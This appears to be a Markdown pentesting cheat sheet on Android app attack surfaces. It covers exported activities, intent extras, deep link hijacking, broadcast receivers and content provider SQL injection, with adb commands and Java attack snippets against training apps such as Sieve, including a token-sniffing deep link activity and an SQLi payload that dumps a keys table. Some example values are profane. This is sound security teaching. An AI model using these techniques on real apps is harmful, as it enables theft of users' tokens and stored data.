# Content
- [Exported Actvites](#exported-actvites)
- [Exported Actvites with Extras](#exported-actvites-with-extras)
- [Deep Links Hijacking](#deep-links-hijacking)
- [Broadcastreceiver](#broadcastreceiver)
- []()

# Exported Actvites
exported actvites can lead to see senstive info also can lead to open another actvites and more functions which maybe danger if anyone can do that
## How to find ? 
### in `AndroidManifest.xml`
- search for  `android:exported="true"` in an activity
- before android 12 if an activity has an `intent-filter` declared in the manifest, Android automatically considers the activity as exported, even if you don't explicitly set `exported="true"`

```xml
<intent-filter>
  <action android:name="android.intent.action.MAIN"/>
  <category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
```

### open activity using shell
```powershell
am start-activity -n <package name>/.<activity name>
am start-activity -n com.mwr.example.sieve/.FileSelectActivity
```

### open activity by another app
```java
Intent I =  new Intent();
ComponentName C = new ComponentName("<app package name>", "<activity name>");
I.setComponent(C);
startActivity(I);

// example
Intent I =  new Intent();
ComponentName C = new ComponentName("com.mwr.example.sieve", "com.mwr.example.sieve.PWList");
I.setComponent(C);
startActivity(I);
```


# Exported Actvites with Extras
sometimes we can send an intent with some data if we have a code like the following and if the activity is exported then we can conrtol the data sent to it  



- java code
```java
Intent intent = getIntent();
username = intent.getStringExtra("username");
```
- AndoridMainfest
```xml
<activity android:name=".ChangePin" android:exported="true">
  <intent-filter>
    <action android:name="com.apphacking.changePin"/>
    <category android:name="android.intent.category.DEFAULT"/>
  </intent-filter>
</activity>
```

### open activity and use Extras in shell
```powershell
# explicit intent is an intent to specfic app
am start-activity -n <package name>/.<activity name> --es "paramter" "value"
am start-activity -n com.apphacking.alarmpin/.ChangePin --es "paramter" "value"

# implicit intent is an intent to be recived by appropiate apps
am start-activity -a <intent action name> --es "paramter" "value"
am start-activity -a <intent action name> -c <intent category name> --es "paramter" "value"

am start-activity -a com.apphacking.changePin  --es "username" "hacked"
am start-activity -a com.apphacking.changePin -c android.intent.category.DEFAULT  --es "username" "fuck"
```

### open activity and use Extras in another app
```java
// explicit intent
Intent I = new Intent();
ComponentName C = new ComponentName("<app package name>", "<activity name>");
I.setComponent(C);
I.putExtra("paramter", "value");
startActivity(I);

// example
Intent I = new Intent();
ComponentName C = new ComponentName("com.apphacking.alarmpin", "com.apphacking.alarmpin.ChangePin");
I.setComponent(C);
I.putExtra("username", "fucker");
startActivity(I);

// implicit intent
Intent intent = new Intent();
intent.setAction("<intent action name>"); 
intent.addCategory(<intent category name>);  
intent.putExtra("paramter", "value");        
startActivity(intent); 

// example
Intent intent = new Intent();
intent.setAction("com.apphacking.changePin"); 
intent.addCategory(Intent.CATEGORY_DEFAULT); 
intent.putExtra("username", "fuck");         
startActivity(intent); 
```

# Deep Links Hijacking 
if there a website using a deep link to a mobile and sending senstive data to it we can hijack this deeplink by creating an app using that listen to the same deeplink


- the activity 
```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/sniff"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <TextView
        android:id="@+id/textViewHacked"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

</androidx.constraintlayout.widget.ConstraintLayout>
```
- AndroidMainfest
```xml
<activity android:name=".Sniff" android:exported="true">
  <intent-filter>
    <action android:name="android.intent.action.VIEW"></action>
    <category android:name="android.intent.category.DEFAULT"></category>
    <category android:name="android.intent.category.BROWSABLE"></category>
    <data android:scheme="holiday" > </data>
</intent-filter>
```
- java code
```java
setContentView(R.layout.activity_sniif); // Ensure the layout file name is correct
Intent intent = getIntent();
Uri uri = intent.getData();
TextView textView = findViewById(R.id.textViewHacked);
if (uri != null) {
  String uriString = uri.toString();
  textView.setText("hacked your account: "+uriString);
} else {
  textView.setText("No Uri data received");
}
```
- adb shell
```shell
am start -a android.intent.action.VIEW -d holiday://example.com?token=123456789
```

### look also for applinks and weblinks

# Broadcastreceiver
we can search for broadcastreceivers like the follwoing and we can send an intents to it and controls the data 


- declartion of BroadcastReceiver
```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(myReceiver, new IntentFilter("com.apphacking.broadcastreceiver.MyCustomReceiver"), Context.RECEIVER_EXPORTED);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // On Android 12 and above, but below Android 13
            registerReceiver(myReceiver, new IntentFilter("com.apphacking.broadcastreceiver.MyCustomReceiver"), Context.RECEIVER_NOT_EXPORTED);
        } else {
            // For Android 11 and below
            registerReceiver(myReceiver, new IntentFilter("com.apphacking.broadcastreceiver.MyCustomReceiver"));
        }
    }
    final private BroadcastReceiver myReceiver =  new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("WTF","********************");
            Log.d("WTF", "I recived something");
            Log.d("WTF","********************");
        }
    };
}
```

- sending intent in adb shell 
```shell
am broadcast -a <broadcastreceiver name>
am broadcast -a <broadcastreceiver name> --es "param" "value"

am broadcast -a com.apphacking.broadcastreceiver.MyCustomReceiver2 
am broadcast -a com.apphacking.broadcastreceiver.MyCustomReceiver2 --es "msg" "hacked"
```

- sending intent in another app
```java
public void sendToBroadCast(){
        Intent intent =  new Intent() ;
        intent.setAction("com.apphacking.broadcastreceiver.MyCustomReceiver");
        intent.putExtra("msg","hacked");
        sendBroadcast(intent);
    }
```

### Android 8 and before BroadcastReceivers was declared in AndroidManifest
- AndroidManifest
```xml
        <receiver
            android:name=".SaveData"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_LOW" />
            </intent-filter>
        </receiver>

```
- java code
```java
public class SaveData extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        // Battery is running low!
        System.out.println("###############################");
        System.out.println("           Save Data !         ");
        System.out.println("###############################");
    }
}
```

# ContentProvider
check ContentProvider that is exported to external world this mat lead to SQLi or LFI 

- AndroidManifest Example 
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
  <path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
        
<provider android:name=".FileBackupProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.FileBackupProvider"/>
```

- java class from AndroidManifest that extends ContentProvider
```java
public class DBContentProvider extends ContentProvider
```

## SQLi 
in DBContentProvider class this query function lacks validation so it can be exolited by SQLi
```java
    @Override // android.content.ContentProvider
    public Cursor query(Uri in, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        int type = this.sUriMatcher.match(in);
        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
        if (type >= 100 && type < 200) {
            queryBuilder.setTables(PWTable.TABLE_NAME);
        } else if (type >= 200) {
            queryBuilder.setTables(PWTable.KEY_TABLE_NAME);
        }
        return queryBuilder.query(this.pwdb.getReadableDatabase(), projection, selection, selectionArgs, null, null, sortOrder);
    }
```

### from adb shell
```shell
 content query  --uri content://com.mwr.example.sieve.DBContentProvider/Passwords  --projection "* from Key -- - "
```
### form another android app
- java class
```java
TextView textView = findViewById(R.id.text);
Uri uri = Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords") ;
try {
  String [] projection = new String[] {"* from Key -- -"} ;
  Cursor cursor = getContentResolver().query(uri, projection , null, null, null) ;
  textView.setText(DatabaseUtils.dumpCursorToString(cursor));
}catch (Exception e){
  textView.setText(e.toString());
}
```
- AndroidManifest
```xml
<queries>
  <package android:name="com.mwr.example.sieve" ></package>
</queries>
```
